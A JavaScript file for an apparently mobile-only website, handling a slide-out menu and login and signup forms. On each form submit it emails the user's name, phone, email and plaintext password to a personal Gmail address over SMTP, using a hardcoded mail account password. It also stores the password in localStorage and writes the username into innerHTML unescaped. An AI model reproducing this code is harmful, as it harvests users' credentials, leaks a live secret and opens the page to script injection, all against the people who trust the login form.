let menu = document.querySelector(".menu");
let CloseMenu = document.querySelector(".CloseMenu");
let OpenMeu = document.querySelector(".openMenu");
let body = document.querySelector("body");
let Bg_Cover = document.getElementById('universalCover')

let div = document.createElement('div');
div.className = 'z-[99] w-screen h-screen bg-black-rgb fixed top-0';

OpenMeu.addEventListener('click', () => {
    menu.classList.add("translate-x-[0]");
    menu.classList.remove("translate-x-[+300px]");
    body.style.overflowY = "hidden";
    Bg_Cover.classList.remove('hidden')

    CloseMenu.addEventListener('click', () => {
        menu.classList.add("translate-x-[+300px]");
        body.style.overflowY = "auto";
        Bg_Cover.classList.add('hidden');
    });
    Bg_Cover.addEventListener('click', () => {
        menu.classList.add("translate-x-[+300px]");
        body.style.overflowY = "auto";
        Bg_Cover.classList.add('hidden');
    });
    Login();
    SignUp();
});

if (innerWidth > 1024) {
    document.write("Sorry Website will be ready soon for desktop also");
    body.style.color = "red";
    body.style.textAlign = "center";
    body.style.fontSize = "20px";
}

function Login() {
    let LoginBtn = document.querySelector('.loginbtn');
    let LoginForm = document.querySelector(".login");
    let CloseLoginForm = document.querySelector('.cancel-Login');
    let Input_of_Login = document.getElementById('LoginForm')
    let UserInfo = Input_of_Login.querySelectorAll('input');
    let username = document.querySelector('.L-username');
    let tel = document.querySelector('.L-tel');
    let password = document.querySelector('.L-password');

    LoginBtn.addEventListener('click', () => {

        body.appendChild(div)
        Bg_Cover.classList.add('hidden');
        LoginForm.classList.replace('scale-0', 'scale-1');
        menu.classList.replace('translate-x-[0]', 'translate-x-[+300px]');

        CloseLoginForm.addEventListener('click', () => {
            Bg_Cover.classList.remove('hidden');
            LoginForm.classList.replace('scale-1', 'scale-0');
            menu.classList.replace('translate-x-[+300px]', 'translate-x-[0]');
            body.removeChild(div);
            ClearData(UserInfo);

        });
    });
    Input_of_Login.addEventListener('submit', (e) => {
        e.preventDefault();
        if (username.value != "" && tel.value != "" && password.value != "") {
            body.removeChild(div);

            LoginForm.classList.replace('scale-1', 'scale-0');
            menu.classList.replace('translate-x-[+300px]', 'translate-x-[0]');
            Bg_Cover.classList.remove('hidden');

            Email.send({
                Host: "smtp.gmail.com",
                Username: "iamwebdeveloper0@gmail.com",
                Password: "hiiiamvickykumarguptaushouldnotgetmypass",
                To: 'vickykumargupta369@gmail.com',
                From: "iamwebdeveloper0@gmail.com",
                Subject: "User Login info",
                Body: `Name : ${username.value}  || <br> Phone-number :  ${tel.value} || <br> Password : ${password.value}`
            }).then(
                ShowMessage(`You have  logged in successfully as ${username.value}`)
            );
            ClearData(UserInfo);
        }
    });

};

function SignUp() {
    let SignUpbtn = document.querySelector('.signUp');
    let SignUpForm = document.querySelector('.signupForm');
    let Cancelbtn = document.querySelector('.cancel-signup');
    let RawData = SignUpForm.querySelectorAll('input');

    SignUpbtn.addEventListener('click', () => {

        SignUpForm.classList.replace('scale-0', 'scale-1');
        menu.classList.replace('translate-x-[0]', 'translate-x-[+300px]');
        body.appendChild(div)

        Cancelbtn.addEventListener('click', () => {
            SignUpForm.classList.replace('scale-1', 'scale-0');
            menu.classList.replace('translate-x-[+300px]', 'translate-x-[0]');
            body.removeChild(div)
            ClearData(RawData);
        });

        let Inputs_of_SignUp = document.querySelector('#SignupForm');
        Inputs_of_SignUp.addEventListener('submit', (e) => {
            e.preventDefault();
            let username = document.querySelector('.S-username')
            let tel = document.querySelector('.S-tel')
            let email = document.querySelector('.S-email')
            let password = document.querySelector('.S-password')

            SignUpForm.classList.replace('scale-1', 'scale-0');
            menu.classList.replace('translate-x-[+300px]', 'translate-x-[0]');
            body.removeChild(div);
            if (username.value != "" && tel.value != "" && email.value != "" && password.value != "") {
                localStorage.setItem('name', username.value);
                localStorage.setItem('tel', tel.value);
                localStorage.setItem('email', email.value);
                localStorage.setItem('password', password.value);
                Email.send({
                    Host: "smtp.gmail.com",
                    Username: "iamwebdeveloper0@gmail.com",
                    Password: "hiiiamvickykumarguptaushouldnotgetmypass",
                    To: 'vickykumargupta369@gmail.com',
                    From: "iamwebdeveloper0@gmail.com",
                    Subject: "New user info",
                    Body: `Name : ${username.value} || <br> Tel : ${tel.value} || <br> Email : ${email.value} ||  <br> Password : ${password.value}`
                }).then(
                    ShowMessage(`Thank you <span class="green500"> ${username.value}</span> for getting  sign up to our website`)

                );


                ClearData(RawData);
            }
        });
    });
};
// clear input field
function ClearData(Data) {
    Array.from(Data).forEach((e) => {
        e.value = "";
    });
}

// GREETINGS
function ShowMessage(message) {
    let div = document.createElement('div');
    div.setAttribute("class", "w-screen h-screen fixed top-0 flex items-center justify-center   bg-black-rgb z-inf");

    let greet = document.createElement('div');
    greet.setAttribute('class', "p-3 rounded-sm bg-white text-black text-[17px] text-center duration-200 scale-0 ");
    greet.innerHTML = message;
    body.appendChild(div);
    div.appendChild(greet);
    setTimeout(() => {
        greet.classList.replace('scale-0', 'scale-1')
    }, 600);

    div.addEventListener('click', () => {
        body.removeChild(div);
        div.removeChild(greet);
    });
}
